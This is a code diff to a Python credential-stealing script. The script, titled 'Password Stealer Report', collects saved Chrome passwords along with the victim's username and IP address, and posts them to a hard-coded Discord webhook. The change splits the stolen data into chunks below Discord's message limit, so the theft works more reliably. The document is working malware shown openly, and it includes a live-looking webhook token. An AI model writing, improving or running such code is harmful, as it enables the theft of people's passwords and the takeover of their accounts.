@@ -57,14 +57,30 @@ def send_to_webhook(passwords):
     webhook_url = "https://discord.com/api/webhooks/1396114728497188955/el1tR6M760YCZYK4biJUev2L-Y8ZNEZjM_Frq0_8nBIkyTibJkyhDqSR599QBPr8L2kA"
     username = getpass.getuser()
     ip_address = socket.gethostbyname(socket.gethostname())
-    data = {
-        "content": f"**Password Stealer Report**\nUser: {username}\nIP: {ip_address}\n\n**Chrome Passwords**:\n" + "\n".join(passwords)
-    }
-    try:
-        response = requests.post(webhook_url, json=data)
-        return response.status_code == 204
-    except Exception as e:
-        return f"Webhook error: {str(e)}"
+    
+    # Split passwords into chunks to avoid Discord's 2000-char limit
+    max_length = 1900  # Leave room for header
+    header = f"**Password Stealer Report**\nUser: {username}\nIP: {ip_address}\n\n**Chrome Passwords**:\n"
+    current_message = header
+    messages = []
+    
+    for password in passwords:
+        if len(current_message) + len(password) + 1 > max_length:
+            messages.append(current_message)
+            current_message = header
+        current_message += password + "\n"
+    if current_message != header:
+        messages.append(current_message)
+
+    # Send each message
+    for message in messages:
+        try:
+            response = requests.post(webhook_url, json={"content": message})
+            if response.status_code != 204:
+                return f"Webhook error: HTTP {response.status_code}"
+        except Exception as e:
+            return f"Webhook error: {str(e)}"
+    return "Success"
 
 if __name__ == "__main__":
     passwords = get_chrome_passwords()
